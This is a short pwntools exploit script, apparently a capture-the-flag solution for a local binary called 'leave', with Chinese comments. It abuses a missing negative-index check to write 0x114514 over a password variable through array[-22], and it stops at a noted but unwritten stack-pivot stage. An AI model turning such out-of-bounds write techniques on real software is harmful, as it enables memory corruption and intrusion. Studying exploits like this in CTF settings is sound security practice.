from pwn import *

r = process(r'./leave')
context.log_level = 'debug'

# add()函数读取一个 4 字节的索引buf，仅检查buf > 9的情况，但未检查buf < 0的情况。那么可以输入负数索引，从而访问数组array之外的内存地址
# array数组的地址为：0x4040A0，password的地址为：0x404048，两者相差-0x58, 即88/4=22
# 即通过array[-22]就能越界访问password的地址
# -22的补码为：0xffffffea, 小端序下为：\xea\xff\xff\xff
r.sendafter(b'index(0-9): ', b'\xea\xff\xff\xff')
# password == 1131796, 1131796的十六进制为：0x114514, 小端序下为：\x14\x45\x11\x00
r.sendafter(b']: ', b'\x14\x45\x11\x00')

# 进入check函数的溢出点，这里buf大小0x30，read的字节为0x40，明显不够。
# 需要进行栈迁移
# ...

r.interactive()
